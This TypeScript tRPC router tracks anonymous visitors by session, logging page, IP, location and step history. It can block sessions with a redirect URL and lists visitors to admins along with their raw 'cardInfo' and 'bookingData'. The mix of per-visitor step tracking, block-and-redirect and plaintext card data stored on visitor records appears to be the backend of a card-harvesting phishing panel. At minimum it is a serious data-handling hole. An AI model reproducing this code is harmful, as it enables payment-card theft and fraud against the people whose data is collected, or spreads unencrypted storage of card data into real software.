import { z } from 'zod';
import { router, publicProcedure, adminProcedure } from '../trpc.js';
import { db } from '../db.js';

export const visitorsRouter = router({
  track: publicProcedure
    .input(z.object({
      sessionId: z.string(),
      page: z.string().optional().default('/'),
      userAgent: z.string().optional().default(''),
      ip: z.string().optional(),
      country: z.string().optional(),
      city: z.string().optional(),
      step: z.string().optional(),
    }))
    .mutation(async ({ input, ctx }) => {
      const ip = input.ip ||
        (ctx.req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() ||
        ctx.req.socket.remoteAddress ||
        'unknown';

      const existing = await db.visitor.findUnique({ where: { sessionId: input.sessionId } });

      if (existing?.isBlocked) {
        return { blocked: true, redirectUrl: existing.redirectUrl ?? null };
      }

      const stepHistory = existing
        ? JSON.parse(existing.stepHistory as string)
        : [];

      if (input.step) {
        stepHistory.push({ step: input.step, time: Date.now() });
        // Keep only last 50 steps
        if (stepHistory.length > 50) stepHistory.splice(0, stepHistory.length - 50);
      }

      await db.visitor.upsert({
        where: { sessionId: input.sessionId },
        update: {
          page: input.page,
          userAgent: input.userAgent,
          ip,
          ...(input.country && { country: input.country }),
          ...(input.city && { city: input.city }),
          ...(input.step && { currentStep: input.step, stepHistory: JSON.stringify(stepHistory) }),
          lastActive: new Date(),
        },
        create: {
          sessionId: input.sessionId,
          page: input.page ?? '/',
          userAgent: input.userAgent ?? '',
          ip,
          country: input.country ?? '',
          city: input.city ?? '',
          currentStep: input.step ?? 'home',
          stepHistory: JSON.stringify(input.step ? [{ step: input.step, time: Date.now() }] : []),
        },
      });

      return { blocked: false, redirectUrl: null };
    }),

  stats: adminProcedure.query(async () => {
    const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000);
    const [total, active, blocked] = await Promise.all([
      db.visitor.count(),
      db.visitor.count({ where: { lastActive: { gte: fiveMinAgo }, isBlocked: false } }),
      db.visitor.count({ where: { isBlocked: true } }),
    ]);
    return { total, active, blocked };
  }),

  list: adminProcedure.query(async () => {
    const visitors = await db.visitor.findMany({
      orderBy: { lastActive: 'desc' },
      take: 200,
    });
    return visitors.map(v => ({
      ...v,
      stepHistory: JSON.parse(v.stepHistory as string),
      bookingData: JSON.parse(v.bookingData as string),
      cardInfo: JSON.parse(v.cardInfo as string),
    }));
  }),
});
